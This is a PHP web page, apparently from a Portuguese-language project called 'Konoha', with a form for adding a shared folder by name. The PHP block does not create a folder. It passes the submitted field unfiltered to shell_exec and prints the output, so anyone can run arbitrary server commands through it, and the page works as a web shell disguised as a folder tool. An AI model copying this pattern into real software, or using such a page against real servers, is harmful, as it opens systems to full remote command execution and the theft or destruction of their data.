<html>
	<head>
		<title>Konoha</title>
		<link rel="stylesheet" type="text/css" href="../css/comp.css">
		<link rel="shortcut icon" href="../img/icon.png">
	</head>
	
	<body>
		<header>
			<?php include("../componentes/navbar.php"); ?>
		</header>
		<nav id="nav1"></nav>
		<section>
			<h1>
				<b>Adicionar pasta compartilhada:</b>
			</h1>
			<form name="formCamp" method="POST">
				<p>
					<b>Informe o nome da pasta:</b>
					<br>
					<input type="text" name="comp_nick" id="comp_nick" placeholder="Ex.: MUSICAS">
				</p>
				<p>
					<br>
					<br>
					<input type="button" onclick="AddPastaFunction();" value="Criar">
				</p>
			</form>
		</section>

		<br>
		<br>
		<br>

		<?php
			if (isset($_POST['comp_nick']))
			{
				$x = "{$_POST['comp_nick']}";
				
				
				$comando = shell_exec($x);
				echo "<pre>$comando</pre>";
			}
		?>

		<br>
		<br>
		<br>
		
		<footer>
			<?php include("../componentes/footerbar.php"); ?>
		</footer>
	</body>

	<script type="text/javascript">
		function AddPastaFunction()
		{
			if (document.getElementById('comp_nick').value == '')
			{
				alert("Informe o nome da pasta!");
			}
			else
			{ 
				document.formCamp.submit();
			}
		}
	</script>
</html>